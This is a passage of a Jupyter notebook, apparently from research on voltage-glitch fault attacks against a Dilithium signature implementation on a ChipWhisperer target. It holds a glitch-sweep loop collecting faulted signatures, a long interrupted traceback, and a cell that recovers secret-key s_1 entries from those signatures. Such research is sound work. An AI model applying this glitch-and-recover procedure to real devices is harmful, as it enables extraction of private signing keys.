      "Cell \u001b[0;32mIn [18], line 7\u001b[0m, in \u001b[0;36mone_try\u001b[0;34m(scope, target, gc, message_int, sigs_faulted, sigs_faulted_params)\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[0;32m----> 7\u001b[0m     \u001b[43mtarget\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msign\u001b[49m\u001b[43m(\u001b[49m\u001b[43mmessage\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mTIMEOUT_SIGN\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m      9\u001b[0m     trigger_timeout \u001b[38;5;241m=\u001b[39m scope\u001b[38;5;241m.\u001b[39mcapture()\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/SimpleSerial2Dilithium.py:217\u001b[0m, in \u001b[0;36mSimpleSerial2Dilithium.sign\u001b[0;34m(self, message, timeout)\u001b[0m\n\u001b[1;32m    216\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39msign_send(message)\n\u001b[0;32m--> 217\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msign_recv\u001b[49m\u001b[43m(\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/SimpleSerial2Dilithium.py:221\u001b[0m, in \u001b[0;36mSimpleSerial2Dilithium.sign_recv\u001b[0;34m(self, timeout)\u001b[0m\n\u001b[1;32m    220\u001b[0m ok_reply \u001b[38;5;241m=\u001b[39m \u001b[38;5;124mb\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124msign ok\u001b[39m\u001b[38;5;124m'\u001b[39m\n\u001b[0;32m--> 221\u001b[0m reply \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msimpleserial_read\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;124;43mr\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[38;5;28;43mlen\u001b[39;49m\u001b[43m(\u001b[49m\u001b[43mok_reply\u001b[49m\u001b[43m)\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m    222\u001b[0m \u001b[38;5;28;01massert\u001b[39;00m reply \u001b[38;5;241m==\u001b[39m ok_reply\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/SimpleSerial2Dilithium.py:380\u001b[0m, in \u001b[0;36mSimpleSerial2Dilithium.simpleserial_read\u001b[0;34m(self, cmd, pay_len, end, timeout, ack)\u001b[0m\n\u001b[1;32m    379\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mlen\u001b[39m(\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m__handler\u001b[38;5;241m.\u001b[39mrecords_warning_or_higher) \u001b[38;5;241m==\u001b[39m \u001b[38;5;241m1\u001b[39m \u001b[38;5;129;01mand\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m__handler\u001b[38;5;241m.\u001b[39mrecords_warning_or_higher[\u001b[38;5;241m0\u001b[39m]\u001b[38;5;241m.\u001b[39mmsg \u001b[38;5;241m==\u001b[39m \u001b[38;5;124m'\u001b[39m\u001b[38;5;124mRead timed out: \u001b[39m\u001b[38;5;124m'\u001b[39m:\n\u001b[0;32m--> 380\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m TargetTimeoutError()\n\u001b[1;32m    381\u001b[0m \u001b[38;5;28;01mraise\u001b[39;00m TargetIOError(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mtarget logger logged a warning during simpleserial_read: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00m[r\u001b[38;5;241m.\u001b[39mmsg \u001b[38;5;28;01mfor\u001b[39;00m r \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m__handler\u001b[38;5;241m.\u001b[39mrecords_warning_or_higher]\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m'\u001b[39m, ret)\n",
      "\u001b[0;31mTargetTimeoutError\u001b[0m: Target cleanly timed out while generating a signature",
      "\nDuring handling of the above exception, another exception occurred:\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[0;32mIn [19], line 10\u001b[0m\n\u001b[1;32m      8\u001b[0m scope\u001b[38;5;241m.\u001b[39mglitch\u001b[38;5;241m.\u001b[39mext_offset \u001b[38;5;241m=\u001b[39m i\n\u001b[1;32m      9\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m j \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28mrange\u001b[39m(redo \u001b[38;5;241m+\u001b[39m \u001b[38;5;241m1\u001b[39m):\n\u001b[0;32m---> 10\u001b[0m     new_zeros \u001b[38;5;241m=\u001b[39m \u001b[43mone_try\u001b[49m\u001b[43m(\u001b[49m\u001b[43mscope\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtarget\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mgc\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mmessage\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43msigs_faulted\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43msigs_faulted_params\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m     11\u001b[0m     zeros \u001b[38;5;241m+\u001b[39m\u001b[38;5;241m=\u001b[39m new_zeros\n\u001b[1;32m     12\u001b[0m     \u001b[38;5;28;01mfor\u001b[39;00m i, zero_widget \u001b[38;5;129;01min\u001b[39;00m \u001b[38;5;28menumerate\u001b[39m(zero_widgets):\n",
      "Cell \u001b[0;32mIn [18], line 19\u001b[0m, in \u001b[0;36mone_try\u001b[0;34m(scope, target, gc, message_int, sigs_faulted, sigs_faulted_params)\u001b[0m\n\u001b[1;32m     17\u001b[0m     gc\u001b[38;5;241m.\u001b[39madd(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mreset\u001b[39m\u001b[38;5;124m\"\u001b[39m, param_tuple)\n\u001b[1;32m     18\u001b[0m     __LOGGER\u001b[38;5;241m.\u001b[39minfo(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mfailed due to read timeout: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00me\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m'\u001b[39m)\n\u001b[0;32m---> 19\u001b[0m     \u001b[43mtarget\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mreboot_flush\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[1;32m     20\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m new_zeros\n\u001b[1;32m     21\u001b[0m \u001b[38;5;28;01mexcept\u001b[39;00m TargetIOError \u001b[38;5;28;01mas\u001b[39;00m e:\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/SimpleSerial2Dilithium.py:329\u001b[0m, in \u001b[0;36mSimpleSerial2Dilithium.reboot_flush\u001b[0;34m(self, timeout)\u001b[0m\n\u001b[1;32m    327\u001b[0m time\u001b[38;5;241m.\u001b[39msleep(\u001b[38;5;241m0.05\u001b[39m)\n\u001b[1;32m    328\u001b[0m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mscope\u001b[38;5;241m.\u001b[39mio\u001b[38;5;241m.\u001b[39mnrst \u001b[38;5;241m=\u001b[39m \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mhigh_z\u001b[39m\u001b[38;5;124m\"\u001b[39m\n\u001b[0;32m--> 329\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mwait_for_boot_msg\u001b[49m\u001b[43m(\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/SimpleSerial2Dilithium.py:335\u001b[0m, in \u001b[0;36mSimpleSerial2Dilithium.wait_for_boot_msg\u001b[0;34m(self, timeout, flush)\u001b[0m\n\u001b[1;32m    333\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mflush()\n\u001b[1;32m    334\u001b[0m \u001b[38;5;66;03m# why is the overhead byte \\x0b? Is it always that value? We will see ...\u001b[39;00m\n\u001b[0;32m--> 335\u001b[0m data_read \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mread_until_blocking\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;124;43mb\u001b[39;49m\u001b[38;5;124;43m'\u001b[39;49m\u001b[38;5;130;43;01m\\x0b\u001b[39;49;00m\u001b[38;5;124;43mb\u001b[39;49m\u001b[38;5;130;43;01m\\x07\u001b[39;49;00m\u001b[38;5;124;43mboot ok\u001b[39;49m\u001b[38;5;130;43;01m\\xc1\u001b[39;49;00m\u001b[38;5;130;43;01m\\x00\u001b[39;49;00m\u001b[38;5;124;43m'\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m \u001b[38;5;66;03m# simpleserial_put('b', sizeof(\"boot ok\") - 1, \"boot ok\");\u001b[39;00m\n\u001b[1;32m    336\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m data_read\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/SimpleSerial2Dilithium.py:316\u001b[0m, in \u001b[0;36mSimpleSerial2Dilithium.read_until_blocking\u001b[0;34m(self, pattern, timeout)\u001b[0m\n\u001b[1;32m    314\u001b[0m start \u001b[38;5;241m=\u001b[39m time\u001b[38;5;241m.\u001b[39mtime()\n\u001b[1;32m    315\u001b[0m \u001b[38;5;28;01mwhile\u001b[39;00m time\u001b[38;5;241m.\u001b[39mtime() \u001b[38;5;241m-\u001b[39m start \u001b[38;5;241m<\u001b[39m timeout \u001b[38;5;241m/\u001b[39m \u001b[38;5;241m1000\u001b[39m:\n\u001b[0;32m--> 316\u001b[0m     onecharstring \u001b[38;5;241m=\u001b[39m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mread\u001b[49m\u001b[43m(\u001b[49m\u001b[43mnum_char\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;241;43m1\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[38;5;241;43m1\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[1;32m    317\u001b[0m     \u001b[38;5;28;01massert\u001b[39;00m \u001b[38;5;28mtype\u001b[39m(onecharstring) \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;28mstr\u001b[39m\n\u001b[1;32m    318\u001b[0m     \u001b[38;5;28;01massert\u001b[39;00m \u001b[38;5;28mlen\u001b[39m(onecharstring) \u001b[38;5;129;01min\u001b[39;00m [\u001b[38;5;241m0\u001b[39m, \u001b[38;5;241m1\u001b[39m]\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/SimpleSerial2.py:579\u001b[0m, in \u001b[0;36mSimpleSerial2.read\u001b[0;34m(self, num_char, timeout)\u001b[0m\n\u001b[1;32m    577\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m timeout \u001b[38;5;241m==\u001b[39m \u001b[38;5;241m0\u001b[39m:\n\u001b[1;32m    578\u001b[0m     timeout \u001b[38;5;241m=\u001b[39m \u001b[38;5;241m1000000000000\u001b[39m\n\u001b[0;32m--> 579\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mser\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mread\u001b[49m\u001b[43m(\u001b[49m\u001b[43mnum_char\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/simpleserial_readers/_base.py:135\u001b[0m, in \u001b[0;36mSimpleSerialTemplate.read\u001b[0;34m(self, num, timeout)\u001b[0m\n\u001b[1;32m    132\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m ret\u001b[38;5;241m.\u001b[39mdecode(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mlatin-1\u001b[39m\u001b[38;5;124m'\u001b[39m)\n\u001b[1;32m    134\u001b[0m \u001b[38;5;66;03m# If we didn't get enough data, try to read more from the hardware\u001b[39;00m\n\u001b[0;32m--> 135\u001b[0m data \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mbytearray\u001b[39m(\u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mhardware_read\u001b[49m\u001b[43m(\u001b[49m\u001b[43mnum\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[38;5;241;43m=\u001b[39;49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m)\u001b[38;5;241m.\u001b[39mdecode(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mlatin-1\u001b[39m\u001b[38;5;124m'\u001b[39m)\n\u001b[1;32m    136\u001b[0m \u001b[38;5;28;01mfor\u001b[39;00m c \u001b[38;5;129;01min\u001b[39;00m data:\n\u001b[1;32m    137\u001b[0m     \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mterminal_queue\u001b[38;5;241m.\u001b[39mappend([\u001b[38;5;124m'\u001b[39m\u001b[38;5;124min\u001b[39m\u001b[38;5;124m'\u001b[39m, c])\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/capture/targets/simpleserial_readers/cwlite.py:72\u001b[0m, in \u001b[0;36mSimpleSerial_ChipWhispererLite.hardware_read\u001b[0;34m(self, num, timeout)\u001b[0m\n\u001b[1;32m     71\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mhardware_read\u001b[39m(\u001b[38;5;28mself\u001b[39m, num, timeout\u001b[38;5;241m=\u001b[39m\u001b[38;5;241m250\u001b[39m):\n\u001b[0;32m---> 72\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[38;5;28;43mself\u001b[39;49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mcwlite_usart\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mread\u001b[49m\u001b[43m(\u001b[49m\u001b[43mnum\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m)\u001b[49m\n",
      "File \u001b[0;32m~/chipwhisperer.dilithium/jupyter/courses/fault101/../../../software/chipwhisperer/hardware/naeusb/serial.py:217\u001b[0m, in \u001b[0;36mUSART.read\u001b[0;34m(self, dlen, timeout)\u001b[0m\n\u001b[1;32m    215\u001b[0m     \u001b[38;5;66;03m# time.sleep(0.001)\u001b[39;00m\n\u001b[1;32m    216\u001b[0m     \u001b[38;5;28;01mif\u001b[39;00m (timeout \u001b[38;5;241m%\u001b[39m \u001b[38;5;241m10\u001b[39m) \u001b[38;5;241m==\u001b[39m \u001b[38;5;241m0\u001b[39m:\n\u001b[0;32m--> 217\u001b[0m         \u001b[43mtime\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43msleep\u001b[49m\u001b[43m(\u001b[49m\u001b[38;5;241;43m0.01\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[1;32m    219\u001b[0m \u001b[38;5;66;03m# print(\"read: \" + str(resp))\u001b[39;00m\n\u001b[1;32m    220\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m resp\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "start_time = time.time()\n",
    "do_break = False\n",
    "for glitch_setting in gc.glitch_values():\n",
    "    scope.glitch.offset = glitch_setting[1]\n",
    "    scope.glitch.width = glitch_setting[0]\n",
    "    message = glitch_setting[2]\n",
    "    for i in glitch_spots:\n",
    "        scope.glitch.ext_offset = i\n",
    "        for j in range(redo + 1):\n",
    "            new_zeros = one_try(scope, target, gc, message, sigs_faulted, sigs_faulted_params)\n",
    "            zeros += new_zeros\n",
    "            for i, zero_widget in enumerate(zero_widgets):\n",
    "                zero_widget.value = zeros[i]\n",
    "        if np.all(zeros > MIN_ZEROS):\n",
    "            do_break = True\n",
    "    if do_break:\n",
    "        break\n",
    "end_time = time.time()\n",
    "total_duration = end_time - start_time\n",
    "print(f'total duration: {total_duration}s {total_duration/60}min {total_duration/3600}h')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "result_data = {\n",
    "    \"sig_correct\": list(sig_correct),\n",
    "    \"glitch_spots\": list(glitch_spots),\n",
    "    \"width_start\": width_start,\n",
    "    \"width_stop\": width_stop,\n",
    "    \"offset_start\": offset_start,\n",
    "    \"offset_stop\": offset_stop,\n",
    "    \"repeat\": repeat,\n",
    "    \"redo\": redo,\n",
    "    \"repeat\": repeat,\n",
    "    \"step\": step,\n",
    "    \"sigs_faulted\": list(map(lambda s: list(s), sigs_faulted)),\n",
    "    \"sigs_faulted_param_descripton\": \"0 = ext_offset, 1 = offset, 2 = width\",\n",
    "    \"sigs_faulted_params\": sigs_faulted_params\n",
    "}\n",
    "with open(f'iter2random{uuid.uuid4()}.json', 'w') as f:\n",
    "    json.dump(result_data, f)\n",
    "#json.dumps(result_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "sigs_faulted_unpacked = list(map(lambda sig_packed: d._unpack_sig_full(sig_packed), sigs_faulted))\n",
    "from dilithium_solver.signature import Signature, calculate_c_matrix_np\n",
    "from dilithium_solver.recover_s_1_entry import recover_s_1_entry\n",
    "from dilithium_solver.parameters import Parameters\n",
    "\n",
    "params = Parameters.get_nist_security_level(d.nist_security_level)\n",
    "\n",
    "sigs = list(map(\n",
    "    lambda sig_faulted: Signature(\n",
    "        sig_faulted[1],\n",
    "        sig_faulted[0],\n",
    "        calculate_c_matrix_np(sig_faulted[0], params)\n",
    "    ), sigs_faulted_unpacked))\n",
    "s_1_entry_index = 0\n",
    "\n",
    "\n",
    "s_1 = d._unpack_sk(sk)[4]\n",
    "timeout = 10\n",
    "threshold = d.beta\n",
    "for i in range(len(sigs_faulted_unpacked[0][1])): # long version of saying \"l\"\n",
    "    result = recover_s_1_entry(sigs, i, s_1, params, 142387, timeout, threshold) # this number is not relevant\n",
    "    print(result)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
